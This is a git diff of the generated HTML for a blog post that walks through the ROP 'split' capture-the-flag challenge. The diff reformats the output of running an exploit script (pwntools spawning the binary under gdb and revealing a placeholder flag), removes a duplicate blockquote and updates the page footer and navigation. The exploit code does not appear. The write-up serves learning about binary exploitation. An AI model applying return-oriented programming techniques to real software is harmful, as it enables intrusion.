+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 exploit.py
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ python3 exploit.py
+
+<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./split&#39;</span>: pid <span class="m">101757</span>
+<span class="o">[</span>*<span class="o">]</span> running in new terminal: <span class="o">[</span><span class="s1">&#39;/usr/bin/gdb&#39;</span>, <span class="s1">&#39;-q&#39;</span>, <span class="s1">&#39;./split&#39;</span>, <span class="s1">&#39;101757&#39;</span>, <span class="s1">&#39;-x&#39;</span>, <span class="s1">&#39;/tmp/pwnywkpk4ct.gdb&#39;</span><span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span> Waiting <span class="k">for</span> debugger: Done
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+ Thank you!
+ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
+$
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>[+] Starting local process &lsquo;./split&rsquo;: pid 101757</p>
-<p>[*] running in new terminal: ['/usr/bin/gdb&rsquo;, &lsquo;-q&rsquo;, &lsquo;./split&rsquo;, &lsquo;101757&rsquo;, &lsquo;-x&rsquo;, &lsquo;/tmp/pwnywkpk4ct.gdb&rsquo;]</p>
-<p>[+] Waiting for debugger: Done</p>
-<p>[*] Switching to interactive mode</p>
-<p>Thank you!</p>
-<p>ROPE{a_placeholder_32byte_flag!}</p>
-<p>$</p>
-</blockquote>
-</div><div class="post-footer" id="post-footer">
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2022-05-13</span>
+                <span>Updated on 2022-05-14&nbsp;<a class="git-hash" href="https://github.com/w-disaster/LoveIt/commit/a98c088cb613c31ff6f06439f32a54f14866c9e8" target="_blank" title="commit by w-disaster(luca.fabri1999@gmail.com) a98c088cb613c31ff6f06439f32a54f14866c9e8: style changes in rop challenges">
+                                    <i class="fas fa-hashtag fa-fw"></i>a98c088</a></span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -460,7 +549,8 @@ Now we can build the rop chain. At the ret instruction at the end of <code>pwnme
         </section>
     </div>
 
-    <div class="post-nav"><a href="/callme/" class="prev" rel="prev" title="ROP - Callme"><i class="fas fa-angle-left fa-fw"></i>ROP - Callme</a></div>
+    <div class="post-nav"><a href="/callme/" class="prev" rel="prev" title="ROP - Callme"><i class="fas fa-angle-left fa-fw"></i>ROP - Callme</a>
+            <a href="/write4/" class="next" rel="next" title="ROP - Write4">ROP - Write4<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="valine" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
